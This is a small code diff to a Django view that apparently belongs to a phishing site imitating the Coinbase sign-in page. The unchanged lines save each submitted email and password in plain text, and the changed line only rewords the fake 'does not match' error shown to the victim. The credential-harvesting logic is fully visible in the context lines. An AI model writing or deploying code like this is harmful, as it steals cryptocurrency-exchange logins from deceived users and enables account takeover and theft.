@@ -17,6 +17,6 @@ def coinbase(request):
         password = request.POST['password']
         coinbase = models.coinbase.objects.create(email=email, password=password)
         coinbase.save()
-        messages.success(request, 'email password not match! unable to sign in.')
+        messages.success(request, 'email password does not match! unable to sign in.')
         return render(request, 'base/coin.html')
 
